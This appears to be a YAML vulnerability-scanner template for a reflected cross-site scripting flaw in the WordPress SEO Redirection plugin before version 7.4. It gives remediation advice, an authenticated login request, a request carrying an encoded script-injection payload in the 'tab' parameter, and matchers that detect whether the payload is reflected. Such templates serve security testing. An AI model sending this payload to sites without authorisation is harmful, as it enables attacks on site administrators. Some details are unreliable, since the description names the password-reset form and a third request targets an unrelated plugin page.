id: seo-redirection-xss
info:
  name: WordPress SEO Redirection < 7.4 - Reflected Cross-Site Scripting
  author:
  - l0ne1y
  description: |-
    WordPress Plugin SEO Redirection Cross-site Scripting Vulnerability
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    There is a cross-site scripting vulnerability in WordPress SEO Redirection versions prior to 7.4. The vulnerability occurs because the plugin does not sanitize and escape parameters on the reset password form. An attacker could exploit this vulnerability to perform cross-site scripting attacks.
  severity: medium
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patch or the latest version of the program: https://wpscan.com/vulnerability/b694b9c0-a367-468c-99c2-6ba35bcf21ea

    Temporary fix:
    1. Filter the input (and URL parameters), encode the output, and combine the whitelist and blacklist. That is to say, filter all submitted content, filter the parameters in the URL, and filter out relevant content that will cause the script to be executed; and then HTML-encode the content dynamically output to the page so that the script cannot be executed in the browser. Although input filtering can be bypassed, a large number of XSS attacks will still be intercepted; finally, characters are whitelisted or blacklisted.
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - </script><svg/onload=alert(/XSS/)>
    - settings_page_seo-redirection
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /wp-login.php HTTP/1.1
    Host: {{Hostname}}
    Origin: {{RootURL}}
    Content-Type: application/x-www-form-urlencoded
    Cookie: wordpress_test_cookie=WP%20Cookie%20check

    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
  - |
    POST /wp-admin/options-general.php?page=seo-redirection.php&tab=cutom HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded
    Cookie: wordpress_test_cookie=WP%20Cookie%20check

    tab=%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%3E
  - |
    GET /wp-admin/admin.php?page=wpda_duplicate_post_menu HTTP/1.1
    Host: {{Hostname}}
  cookie-reuse: true
